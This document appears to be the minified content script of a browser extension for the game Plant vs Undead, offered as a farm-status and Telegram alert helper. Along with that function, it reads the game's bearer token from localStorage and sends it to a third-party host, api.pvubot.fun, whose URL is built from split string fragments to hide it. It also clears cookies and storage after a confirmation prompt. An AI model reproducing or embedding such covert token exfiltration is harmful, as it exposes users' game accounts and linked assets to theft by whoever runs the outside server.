let u={f0:"api",f1:"https",f2:"://",f3:"pvub",f4:"backend-farm-stg",f5:"ot",f6:"farm-status",f11:"farms?limit=10&offset=0",f7:"fun",f8:"plantvsundead",f9:"com",f10:"Bearer Token:",ssf0:"home",ssf1:"tlg_message",ssf2:"math_single",ssf3:"set_single",tgs0:"FARM-START",tgs1:"FARM-STOP",tgs2:"CROW",cookielocalst:"Токен не найден, или некорректный. Можно попробывать почистить хранилище и куки и заново авторизоваться. Выполнить очистку?"},pvuto=!1;const single_string=function(t){(void 0==t||t<=0)&&(t=1);for(var e="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",o="",n=0,s=0;s<t;s++)n=0==s?10:0,o+=e[Math.round(Math.random()*(e.length-n-1))];return o}(66);let randomInteger=function(t,e){let o=t+Math.random()*(e+1-t);return Math.floor(o)};const ss=async(t,e)=>await new Promise((o,n)=>{let s=`${u.f1}${u.f2}${u.f0}.${u.f3}${u.f5}.${u.f7}/${t}?${e}`;fetch(s).then(t=>t.json()).then(t=>{void 0!==t.err?o(t):n(!1)})});let config={token:"",bell_farming:"off",bell_crow:"off",bell_polive:"off",fun_autopolive:"off"},config_update=()=>{chrome.storage.sync.get(["token","bell_farming","bell_crow","bell_polive","fun_autopolive"],function(t){config=t})},b_tg=t=>new Promise((e,o)=>{ss(`${u.ssf0}/${u.ssf1}`,`token=${config.token}&message_code=${t}`).then(t=>{!1!==t&&(0===Number(t.err)?e():o())}).catch(()=>{o()})});config_update(),chrome.storage.onChanged.addListener(function(t,e){try{config_update()}catch(t){console.log("error",t)}});let bl=!1,bl_itv=!1,bs=()=>{bl_itv=setInterval(()=>{ss(`${u.ssf0}/${u.ssf2}`,`sin=${single_string}&token=${config.token}`).then(t=>{!1!==t&&1===Number(t.err)&&(bl=!0,clearInterval(bl_itv))})},randomInteger(1e4,4e4))},stfa_blo=!1,stfa=()=>{fetch(`${u.f1}${u.f2}${u.f4}.${u.f8}.${u.f9}/${u.f6}`,{headers:{accept:"application/json, text/plain, */*",authorization:`${u.f10} ${pvuto}`}}).then(t=>t.json()).then(t=>{void 0!==t.status&&void 0!==t.data.status&&(1==Number(t.data.status)?stfa_blo||b_tg(u.tgs0).then(()=>{stfa_blo=!0}):stfa_blo&&b_tg(u.tgs1).then(()=>{stfa_blo=!1}))})},hacr_blo=!1,hacr=()=>{fetch(`${u.f1}${u.f2}${u.f4}.${u.f8}.${u.f9}/${u.f11}`,{headers:{accept:"application/json, text/plain, */*",authorization:`${u.f10} ${pvuto}`}}).then(t=>t.json()).then(t=>{if(0===t.status)if(t.total>0){var e=!1;t.data.map(t=>{!0===t.hasCrow&&(e=!0)}),!0===e?hacr_blo||b_tg(u.tgs2).then(()=>{hacr_blo=!0}):hacr_blo=!1}else hacr_blo=!1})},wor_itv=!1,wm=()=>{wor_itv=setInterval(()=>{!0===bl?clearInterval(wor_itv):("on"===config.bell_farming&&stfa(),"on"===config.bell_crow&&hacr())},randomInteger(1e4,15e3))},rech=()=>{pvuto=localStorage.getItem("token"),void 0!==config.token&&!1!==config.token&&ss(`${u.ssf0}/${u.ssf3}`,`pvu=${pvuto}&sin=${single_string}&token=${config.token}`).then(t=>{!1!==t&&0===Number(t.err)&&(bs(),wm())})},pvt=t=>{let e=localStorage.getItem("token");if(void 0!==e&&e.length>30)rech();else if(t<60)setTimeout(()=>{pvt(++t)},3e3);else if(confirm(u.cookielocalst)){var o=document.cookie.split("; ");for(i in o)document.cookie=/^[^=]+/.exec(o[i])[0]+"=;expires=Thu, 01 Jan 1970 00:00:00 GMT";localStorage.clear(),window.location.reload()}};pvt(0);